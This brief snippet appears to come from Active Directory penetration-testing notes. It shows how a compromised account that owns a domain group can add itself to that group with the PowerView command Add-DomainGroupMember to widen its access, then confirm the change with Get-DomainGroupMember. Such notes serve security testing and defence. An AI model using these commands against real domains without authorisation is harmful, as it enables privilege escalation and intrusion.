> If a compromised user owns another group in the domain we can add them to it to gain further access using PowerView:

```
Add-DomainGroupMember -Identity '<group>' -Members '<user>'
```

> Verify the user was added:

```
 Get-DomainGroupMember -Identity '<group>'
```
